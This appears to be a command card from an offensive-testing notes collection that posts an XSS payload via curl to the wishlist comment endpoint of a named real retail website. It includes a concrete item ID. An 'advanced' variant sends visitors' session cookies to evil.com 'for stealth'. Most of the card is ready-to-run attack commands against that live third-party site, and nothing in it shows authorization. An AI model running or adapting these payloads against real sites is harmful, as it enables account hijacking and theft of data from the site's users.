---
id: 123e4567-e89b-12d3-a456-426614174007
name: post-xss-payload-to-wishlist
type: command
executor: bash
data: >-
  curl -X POST
  'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id'
  -H 'Content-Type: application/x-www-form-urlencoded' -d
  'wishlistComment=</textarea><img src=x onerror=alert(1)>'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.914Z'
platforms:
  - Linux
  - Web
tags:
  - xss
  - payload-injection
verified: false
validated: true
submitted: true
---

# post-xss-payload-to-wishlist

## Command

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'wishlistComment=</textarea><img src=x onerror=alert(1)>'
```

## Description

Submits an XSS payload to the wishlist comment endpoint on teavana.com to test for reflected execution by breaking out of the textarea.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `:id` | Wishlist item ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1005285074' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'wishlistComment=</textarea><img src=x onerror=alert(1)>'
```

### Advanced Usage

With silent execution (no alert for stealth):

```bash
curl -X POST 'https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/C1005285074' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'wishlistComment=</textarea><script>fetch(\'https://evil.com/steal?cookie=\' + document.cookie)</script>'
```

## Expected Output

Response with unsanitized reflection: '<textarea maxlength="150" ...></textarea><img src=x onerror=alert(1)></textarea>', triggering JS execution.

## Related

- [[commands/normal-post-to-wishlist]]
- [[procedures/Test-Reflected-XSS-in-Wishlist-Comment]]
